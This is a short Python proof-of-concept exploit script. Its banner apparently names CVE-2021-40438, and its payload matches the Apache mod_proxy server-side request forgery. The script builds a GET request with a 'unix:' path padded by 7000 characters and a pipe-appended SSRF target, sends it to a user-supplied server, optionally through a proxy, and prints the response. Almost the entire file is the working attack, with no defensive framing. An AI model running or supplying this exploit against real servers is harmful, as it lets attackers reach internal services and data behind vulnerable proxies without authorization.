import http.client
import urllib.parse
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("url", type=str, help="URL to exploit, e.g. http://xxx.com")
parser.add_argument("ssrf", type=str, help="SSRF URL to fetch, e.g. http://localhost")
parser.add_argument("-p", "--proxy", type=str, help="Proxy to use, e.g. http://localhost:8080")

args = parser.parse_args()

def exploit(url, ssrf):
    try:
        parsed = urllib.parse.urlparse(url)
        proxy = urllib.parse.urlparse(args.proxy) if args.proxy else None
        conn = http.client.HTTPConnection(proxy.hostname, proxy.port) if proxy else http.client.HTTPConnection(parsed.netloc)
        path = f"{url}/?unix:{'A'*7000}|{ssrf}" if proxy else f"{parsed.path.rstrip('/')}/?unix:{'A'*7000}|{ssrf}"
        
        conn.request("GET", path)
        print(f"[*] Sending request to {url}")
        print(f"[*] SSRF URL: {ssrf}")

        print(f"[*] Response:")
        print(conn.getresponse().read().decode('utf-8'))
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        conn.close()

        

if __name__ == "__main__":
    print("""
        ░█▀▀░█░█░█▀▀░░░░░▀▀▄░▄▀▄░▀▀▄░▀█░░░░░░█░█░▄▀▄░█░█░▀▀█░▄▀▄
        ░█░░░▀▄▀░█▀▀░▄▄▄░▄▀░░█/█░▄▀░░░█░░▄▄▄░░▀█░█/█░░▀█░░▀▄░▄▀▄
        ░▀▀▀░░▀░░▀▀▀░░░░░▀▀▀░░▀░░▀▀▀░▀▀▀░░░░░░░▀░░▀░░░░▀░▀▀░░░▀░
        """)
    exploit(args.url, args.ssrf)
